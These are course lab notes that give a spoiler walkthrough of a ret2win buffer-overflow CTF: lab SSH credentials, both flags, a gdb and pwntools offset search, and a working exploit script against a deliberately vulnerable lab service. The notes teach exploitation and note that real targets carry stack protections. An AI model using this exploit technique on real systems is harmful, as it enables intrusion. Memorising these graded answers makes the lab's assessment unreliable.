---
title: "Lab 8 Notes: Exploit Development (Buffer Overflow)"
---

## CTF walkthrough (spoiler)

The episode's optional CTF challenge asks learners to find `user.txt` and a
second flag from exploiting the vulnerable service on `lab8-vuln-target`
(10.10.8.11), with no hints. Answers:

### Flag 1: user.txt via SSH

```bash
ssh lowpriv@10.10.8.11
# password: lowpriv123
cat user.txt
```

Flag: `flag{lab8_ssh_initial_access}`

### Flag 2: ret2win exploit

```bash
# Find the offset
pwn cyclic 100 > /tmp/pattern.txt
gdb /root/tools/vuln
```

In gdb: `run`, then paste the pattern. At the crash, `$rip` shows the
`ret` instruction's own address (a real, valid address) — not a pattern
value, because jumping to a non-canonical address faults *at* `ret`, not
at the destination. Read the actual corrupted return address off the stack
instead:

```
x/gx $rsp
```

`quit`, then:

```bash
pwn cyclic -l <the-value-from-x/gx-$rsp>
# reports offset 72 (64-byte buffer + 8-byte saved RBP)
```

```bash
python3 -c "from pwn import *; print(hex(ELF('/root/tools/vuln').symbols['win']))"
```

Fill in `exploit_template.py` with the offset (72) and run it:

```python
from pwn import *
exe = ELF('/root/tools/vuln')
io = remote('10.10.8.11', 9999)
payload = b'A' * 72 + p64(exe.symbols['win'])
io.send(payload)
io.interactive()
```

```bash
python3 /root/exploit.py
```

Output includes:

```
flag{lab8_ret2win_stack_overflow}
```

### Lesson

Every protection checked with `checksec` (stack canary, NX, PIE) exists
specifically to break one step of this chain: a canary would catch the
overwrite before `ret` executes; NX would stop injected shellcode from
running (though ret2win doesn't need that, since it jumps to *existing*
code); PIE would randomize `win()`'s address every run. All three off is
what makes this a fair "learn the technique" exercise rather than what
you'd face against a hardened real target.

## Common sticking points

- Learners can misread the crash: `info registers rip` shows a valid
  address inside `vulnerable()` (the `ret` instruction itself), not
  garbage — it's easy to assume the overflow "didn't work" because `$rip`
  doesn't show one of the cyclic pattern bytes. The corrupted value is on
  the stack (`x/gx $rsp`), not in `$rip`, because a non-canonical
  destination faults at the `ret` instruction before the jump completes.
- The offset is 72, not 64: the 64-byte `buffer` is immediately followed by
  the saved RBP (8 bytes) before the saved return address, so the
  overwrite target sits 72 bytes in, not 64.
- `system("/bin/sh")` frequently drops the shell almost immediately because
  there's no TTY attached over the raw `socat`/`remote()` socket — this is
  expected behavior for this basic technique, not a broken exploit. The
  flag print (before the shell spawn) is the actual proof of success and
  what learners are graded on.
- The exploit must be run against the network target (10.10.8.11:9999) via
  `remote()`, using the *local* `/root/tools/vuln` copy only to compute
  `win()`'s address with `pwntools`' `ELF()` — some learners try to run the
  local binary directly instead of connecting to the service.
